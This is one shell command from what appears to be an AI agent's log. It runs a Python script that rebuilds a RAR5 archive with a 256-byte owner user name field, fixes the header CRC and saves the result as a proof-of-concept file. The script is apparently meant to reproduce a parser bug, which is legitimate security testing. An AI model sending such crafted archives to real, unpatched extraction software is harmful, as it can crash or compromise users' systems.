Running command: cd /workspace && python3 - <<'PY'
from pathlib import Path
import zlib
orig=Path('work/owner.rar').read_bytes()
# Build a single-file RAR5 based on first block + mutated first file + endarc.
magic=orig[:8]
main=orig[8:23]  # includes crc + header for main block
endarc=orig[190:]
# Existing first file header body (including raw header size var as first byte), excluding crc, excluding data
file_block_start=23
crc_pos=file_block_start
hdr_var_pos=crc_pos+4
old_raw=orig[hdr_var_pos]
old_hdr=orig[hdr_var_pos:hdr_var_pos+old_raw+1]
# prefix through filename (offset 32 in old_hdr), replace extra entirely
prefix=old_hdr[:32]
name=b'A'*256
field_body=bytes([0x06,0x01])+bytes([0x80,0x02])+name  # id, OWNER_USER_NAME, user_len varint(256), name
field_size=len(field_body)
assert field_size==260
# varint enc
def varint(n):
    out=[]
    while True:
        b=n & 0x7f; n >>=7
        if n: out.append(b|0x80)
        else:
            out.append(b); break
    return bytes(out)
extra=varint(field_size)+field_body
extra_data_size=len(extra)
new_hdr=bytearray(prefix+extra)
# update extra data size at offset 3 in prefix (was 0e); 263 -> 0x87 0x02 two bytes, so prefix after flags changes position. Easier rebuild header fields.
# Let's parse fixed fields from old and rebuild: rawsize placeholder, id=2 flags=3 extra_data_size, data_size=5, then old fields file_flags through filename.
fixed_after_data=old_hdr[6:32] # from file_flags after old data var through filename
body=bytes([0x02,0x03])+varint(extra_data_size)+varint(5)+fixed_after_data+extra
raw_size=len(body)
header=varint(raw_size)+body
crc=zlib.crc32(header)&0xffffffff
block=crc.to_bytes(4,'little')+header+b'1234\n'
poc=magic+main+block+endarc
Path('poc_owner256.rar').write_bytes(poc)
print('raw_size',raw_size,'headerlen',len(header),'extra_data_size',extra_data_size,'field_size',field_size,'total',len(poc),'crc',hex(crc))
# Print parse of block offsets
for i in range(0,min(len(poc),128),16): print(f'{i:04x}:',' '.join(f'{x:02x}' for x in poc[i:i+16]))
PY
ls -l /workspace/poc_owner256.rar
